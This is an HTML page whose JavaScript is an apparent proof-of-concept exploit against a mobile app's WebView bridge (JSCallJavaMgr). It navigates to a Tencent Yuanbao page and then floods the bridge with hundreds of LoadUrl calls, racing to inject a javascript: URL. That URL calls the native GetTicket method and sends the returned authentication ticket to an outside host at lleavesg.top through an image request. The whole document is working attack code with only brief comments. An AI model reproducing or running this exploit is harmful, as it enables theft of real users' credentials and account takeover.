<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Race GetTicket</title></head>
<body>
<h2>Race - GetTicket Steal</h2>
<pre id="log" style="font-size:10px;"></pre>
<script>
var log = document.getElementById('log');
function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }

// 外传地址
var EXFIL = 'https://test2.lleavesg.top/steal';

// 注入 payload：注册 callback + 调用 GetTicket + Image 外传 + 设置 title
var js = 'javascript:void('
    + 'window._s=function(d){'
    +   'document.title=d;'
    +   'new Image().src="' + EXFIL + '?d="+encodeURIComponent(d)'
    + '},'
    + 'JSCallJavaMgr.JSCallNative(JSON.stringify({'
    +   'callback:"_s",'
    +   'module:"CommonPlugin",'
    +   'method:"GetTicket",'
    +   'param:{type:"W9"},'
    +   'callId:"s"'
    + '}))'
    + ')';

var c = 0;
function sendOne() {
    c++;
    var req = JSON.stringify({
        callback: 'cb_' + c,
        module: 'CommonPlugin',
        method: 'LoadUrl',
        param: {url: js},
        callId: 'c' + c
    });
    JSCallJavaMgr.JSCallNative(req);
}

function doRace() {
    if (!window.JSCallJavaMgr) { addLog('ERROR'); return; }
    addLog('URL: ' + location.href);
    addLog('Payload: ' + js.length + ' chars');

    location.href = "https://yuanbao.tencent.com/";

    // Phase 1: 同步循环
    for (var i = 0; i < 500; i++) {
        try { sendOne(); } catch(e) { break; }
    }

    // Phase 2: setTimeout 后备
    for (var d = 0; d <= 500; d += 50) {
        (function(delay) {
            setTimeout(function() {
                for (var j = 0; j < 50; j++) {
                    try { sendOne(); } catch(e) { return; }
                }
            }, delay);
        })(d);
    }

    addLog('Phase1: ' + c + ' calls');
}

setTimeout(function() {
    addLog('Starting in 2s...');
    setTimeout(doRace, 2000);
}, 500);
</script>
</body>
</html>
